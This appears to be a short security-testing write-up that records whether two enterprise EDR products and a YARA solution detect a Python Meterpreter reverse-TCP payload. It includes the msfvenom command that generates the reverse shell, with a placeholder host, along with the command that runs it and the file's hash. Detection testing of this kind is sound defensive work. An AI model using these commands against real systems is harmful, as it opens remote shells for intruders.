**Detections**
* Enterprise EDR Solution 1: Yes (Blocked)
* Enterprise EDR Solution 2: No
* Enterprise YARA Solution: Yes

Reverse TCP payload from msfvenom is run.

We run the following on our VM to generate the payload.

`msfvenom -p python/meterpreter/reverse_tcp LHOST=INSERT_IP_HERE LPORT=8080 -o reverse_tcp.py`


We then put this onto our endpoint. Enterprise EDR Solution 1 performs immediate quarantine without execution required. 


To test out Enterprise EDR Solution 2 and Enterprise YARA Solution, “Protect” is disabled on Enterprise EDR Solution 1 and the file is executed.

`python reverse_tcp.py`

Enterprise EDR Solution 2 misses this.

Hashes:

868f6c6262d61876477e8cf84a90bc5b58e6bafea7d5c7421836709b5cdcf79b  reverse_tcp.py

